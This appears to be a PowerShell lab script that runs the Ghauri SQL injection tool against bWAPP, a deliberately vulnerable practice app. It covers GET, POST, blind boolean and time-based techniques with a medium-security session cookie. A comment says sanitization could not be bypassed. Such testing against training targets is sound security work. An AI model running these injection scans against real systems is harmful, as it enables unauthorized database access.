# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "bwapp"
$ghauri_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.ghauri))
$request = Join-Path $PSScriptRoot $config.targets.$target.request1

$url_get_search = $config.environment.bwapp_docker + "/sqli_1.php?title=123&action=search"
$url_post_search = $config.environment.bwapp_docker + "/sqli_6.php"
$url_blindB = $config.environment.bwapp_docker + "/sqli_4.php?title=123&action=search"
$url_blindT = $config.environment.bwapp_docker + "/sqli_15.php?title=123&action=search"
$url_user_agent = $config.environment.bwapp_docker + "/sqli_17.php"

$phpsessid = $config.targets.$target.phpsessid
$cookie_medium = "security_level=1; PHPSESSID={0}" -f $phpsessid
$request = Join-Path $PSScriptRoot $config.targets.$target.request_file

# Cannot bypass Input Sanitization
& $ghauri_path -u "$url_get_search" --cookie="$cookie_medium" --level 3 --safe-chars="[]" --batch

& $ghauri_path -u "$url_post_search" --data="title=it&action=search" --cookie="$cookie_medium" --batch

& $ghauri_path -u "$url_blindB" --cookie="$cookie_medium" --technique=B --level 2 --batch

& $ghauri_path -u "$url_blindT" --cookie="$cookie_medium" --technique=T --level 2 --batch

& $ghauri_path -r "$request" --cookie="$cookie_medium" --technique=ET --dbms mysql --batch

